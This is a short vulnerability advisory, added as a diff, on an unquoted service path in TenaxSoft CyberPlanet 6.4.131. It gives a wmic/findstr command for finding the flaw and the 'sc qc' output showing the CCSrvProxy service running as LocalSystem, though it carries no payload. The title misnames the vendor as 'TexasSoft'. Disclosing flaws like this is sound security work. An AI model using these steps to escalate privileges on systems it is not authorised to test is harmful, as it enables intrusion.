@@ -1,0 +1,35 @@
+# Exploit Title: TexasSoft CyberPlanet 6.4.131 - 'CCSrvProxy' Unquoted Service Path
+# Date: 2019-11-28
+# Exploit Author: Cristian Ayala G
+# Vendor Homepage: https://tenaxsoft.com/index.html
+# Software Link: https://tenaxsoft.com/descargas.html
+# Version: 6.4.131
+# Tested on: Windows 10 Pro x64
+
+##########################################################################
+
+# Step to discover the unquoted Service:
+
+C:\Users\user>wmic service get name, displayname, pathname, startmode | findstr -i "auto" | findstr -i -v "C:\Windows\\ | findstr """
+CCSrvProxy	CCSrvProxy	 C:\Program Files (x86)\TenaxSoft\CyberPlanet\SrvProxy.exe	Auto
+Control de impresiones Tenax	ControldeImpresiones	C:\Program Files (x86)\TenaxSoft\CyberPlanet\TenaxService64.exe	Auto
+
+##########################################################################
+
+# Service info:
+
+C:\Users\user>sc qc CCSrvProxy
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: CCSrvProxy
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files (x86)\TenaxSoft\CyberPlanet\SrvProxy.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : CCSrvProxy
+        DEPENDENCIAS       : Spooler
+        NOMBRE_INICIO_SERVICIO: LocalSystem
+
+##########################################################################
